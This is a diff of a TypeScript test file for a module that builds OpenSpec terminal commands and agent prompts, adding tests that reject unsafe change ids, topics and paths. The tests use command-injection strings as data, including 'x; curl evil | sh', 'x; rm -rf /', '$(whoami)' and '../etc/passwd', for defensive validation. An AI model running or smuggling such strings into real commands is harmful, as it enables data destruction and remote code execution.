@@ -1,8 +1,9 @@
 import { assert, test } from 'orca/testing'
 import type { Action } from './model'
-import { actionsForItem, findAction, frameworkActions } from './actions'
+import { actionsForItem, findAction, frameworkActions, resolvePaletteAction } from './actions'
 
 const item = {
+  topic: 'add-x',
   openspec: {
     changeId: 'add-x',
     stage: 'implementing' as const,
@@ -24,8 +25,8 @@ const item = {
   }
 }
 
-const openspecOnly = { openspec: item.openspec, superpowers: null }
-const superpowersOnly = { openspec: null, superpowers: item.superpowers }
+const openspecOnly = { topic: 'add-x', openspec: item.openspec, superpowers: null }
+const superpowersOnly = { topic: 'add-x', openspec: null, superpowers: item.superpowers }
 
 const promptOf = (action: Action): string => {
   if (action.run.kind !== 'agent') {
@@ -59,7 +60,10 @@ test('Superpowers actions are always dispatched to an agent', () => {
 })
 
 test('omits OpenSpec actions for an item with no change', () => {
-  const actions = actionsForItem({ openspec: null, superpowers: item.superpowers }, true)
+  const actions = actionsForItem(
+    { topic: 'add-x', openspec: null, superpowers: item.superpowers },
+    true
+  )
   assert.equal(actions.filter((a) => a.framework === 'openspec').length, 0)
   assert.ok(actions.length > 0)
 })
@@ -108,7 +112,7 @@ test('an item with only Superpowers work offers only the Superpowers skills', ()
 })
 
 test('an item with neither side offers nothing', () => {
-  assert.deepEqual(actionsForItem({ openspec: null, superpowers: null }, true), [])
+  assert.deepEqual(actionsForItem({ topic: 'add-x', openspec: null, superpowers: null }, true), [])
 })
 
 test('every action carries the label, the framework and the mutates flag of its row', () => {
@@ -194,7 +198,11 @@ test('the Superpowers prompts name the artifacts they work on', () => {
 
 test('a Superpowers skill with no artifact yet asks for the generic one', () => {
   const actions = actionsForItem(
-    { openspec: null, superpowers: { ...item.superpowers, designSpec: null, plan: null } },
+    {
+      topic: 'add-x',
+      openspec: null,
+      superpowers: { ...item.superpowers, designSpec: null, plan: null }
+    },
     true
   )
   assert.match(promptOf(findAction(actions, 'superpowers.plan')!), /设计 spec/)
@@ -294,4 +302,180 @@ test('every action id the design lists exists', () => {
 test('an unknown action id is not found', () => {
   assert.equal(findAction(actionsForItem(item, true), 'openspec.nope'), null)
   assert.equal(findAction([], 'superpowers.plan'), null)
+})
+
+test('the Superpowers prompt names the topic of the work, not the change id', () => {
+  const actions = actionsForItem(
+    { ...item, topic: 'feature-two', openspec: { ...item.openspec, changeId: 'add-x' } },
+    true
+  )
+  const brainstorm = promptOf(findAction(actions, 'superpowers.brainstorm')!)
+  assert.match(brainstorm, /为 feature-two 产出设计 spec/)
+  assert.equal(brainstorm.includes('add-x'), false)
+})
+
+test('an unsafe change id leaves the item with no OpenSpec action', () => {
+  const actions = actionsForItem(
+    {
+      topic: 'add-x',
+      openspec: { ...item.openspec, changeId: 'x; curl evil | sh' },
+      superpowers: item.superpowers
+    },
+    true
+  )
+  assert.deepEqual(
+    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
+    []
+  )
+  assert.ok(actions.some((action) => action.framework === 'superpowers'))
+})
+
+test('an unsafe change id leaves the item with no OpenSpec action in the agent form either', () => {
+  const actions = actionsForItem(
+    {
+      topic: 'add-x',
+      openspec: { ...item.openspec, changeId: 'x; curl evil | sh' },
+      superpowers: item.superpowers
+    },
+    false
+  )
+  assert.deepEqual(
+    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
+    []
+  )
+})
+
+test('a change id that could be read as an option is refused', () => {
+  const actions = actionsForItem(
+    { topic: 'add-x', openspec: { ...item.openspec, changeId: '--help' }, superpowers: null },
+    true
+  )
+  assert.deepEqual(actions, [])
+})
+
+test('no command line ever carries an unsafe change id', () => {
+  for (const changeId of ['x; rm -rf /', 'a b', '$(whoami)', '`id`', '../escape', 'a|b']) {
+    const actions = actionsForItem(
+      { topic: 'add-x', openspec: { ...item.openspec, changeId }, superpowers: null },
+      true
+    )
+    assert.deepEqual(actions, [], changeId)
+  }
+})
+
+test('an unsafe topic falls back to the generic label', () => {
+  const actions = actionsForItem({ ...item, topic: 'x; rm -rf /' }, true)
+  const brainstorm = promptOf(findAction(actions, 'superpowers.brainstorm')!)
+  assert.match(brainstorm, /为 这个工作项 产出设计 spec/)
+  assert.equal(brainstorm.includes('rm -rf'), false)
+})
+
+test('an unsafe spec path falls back to the generic label', () => {
+  const actions = actionsForItem(
+    { ...item, superpowers: { ...item.superpowers, designSpec: 'docs/; rm -rf /' } },
+    true
+  )
+  const plan = promptOf(findAction(actions, 'superpowers.plan')!)
+  assert.match(plan, /基于 设计 spec 写实施计划/)
+  assert.equal(plan.includes('rm -rf'), false)
+})
+
+test('a path segment that walks up the tree is refused', () => {
+  const actions = actionsForItem(
+    { ...item, superpowers: { ...item.superpowers, plan: '../etc/passwd' } },
+    true
+  )
+  const execute = promptOf(findAction(actions, 'superpowers.execute')!)
+  assert.match(execute, /执行 实施计划/)
+  assert.equal(execute.includes('passwd'), false)
+})
+
+test('an absolute artifact path is allowed', () => {
+  const actions = actionsForItem(
+    {
+      ...item,
+      superpowers: { ...item.superpowers, designSpec: '/abs/specs/x-design.md' }
+    },
+    true
+  )
+  assert.match(
+    promptOf(findAction(actions, 'superpowers.plan')!),
+    /基于 \/abs\/specs\/x-design\.md 写实施计划/
+  )
+})
+
+test('an archived change is not offered the archive command', () => {
+  const actions = actionsForItem(
+    { ...item, openspec: { ...item.openspec, stage: 'archived' } },
+    true
+  )
+  assert.deepEqual(
+    actions.map((action) => action.id),
+    [
+      'openspec.validate',
+      'openspec.show',
+      'superpowers.brainstorm',
+      'superpowers.plan',
+      'superpowers.execute',
+      'superpowers.review',
+      'superpowers.verify'
+    ]
+  )
+})
+
+test("the palette's agent prompt still carries the placeholder", () => {
+  const palette = frameworkActions(false)
+  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
+  assert.match(promptOf(validate), /<change-id>/)
+})
+
+test('a palette command with no change id needs one', () => {
+  const palette = frameworkActions(true)
+  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
+  assert.deepEqual(resolvePaletteAction(validate, undefined), {
+    ok: false,
+    reason: 'needs-change-id'
+  })
+})
+
+test('a palette command with an unsafe change id is refused', () => {
+  const palette = frameworkActions(true)
+  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
+  assert.deepEqual(resolvePaletteAction(validate, 'x; rm -rf /'), {
+    ok: false,
+    reason: 'unsafe-change-id'
+  })
+})
+
+test('a palette command with a safe change id resolves to a runnable command', () => {
+  const palette = frameworkActions(true)
+  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
+  const resolved = resolvePaletteAction(validate, 'add-x')
+  assert.equal(resolved.ok, true)
+  assert.deepEqual(resolved.ok && resolved.action.run, {
+    kind: 'terminal',
+    command: 'openspec validate add-x --strict'
+  })
+})
+
+test("the palette's agent form resolves the change id too", () => {
+  const palette = frameworkActions(false)
+  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
+  const resolved = resolvePaletteAction(validate, 'add-x')
+  assert.equal(resolved.ok, true)
+  const prompt = resolved.ok ? promptOf(resolved.action) : ''
+  assert.match(prompt, /严格校验变更 add-x/)
+  assert.equal(prompt.includes('<change-id>'), false)
+})
+
+test('a palette action without a placeholder resolves to itself', () => {
+  const palette = frameworkActions(true)
+  const list = palette.openspec.find((action) => action.id === 'openspec.list')!
+  assert.deepEqual(resolvePaletteAction(list, undefined), { ok: true, action: list })
+})
+
+test('a palette action without a placeholder ignores the change id', () => {
+  const palette = frameworkActions(true)
+  const list = palette.openspec.find((action) => action.id === 'openspec.list')!
+  assert.deepEqual(resolvePaletteAction(list, 'x; rm -rf /'), { ok: true, action: list })
 })
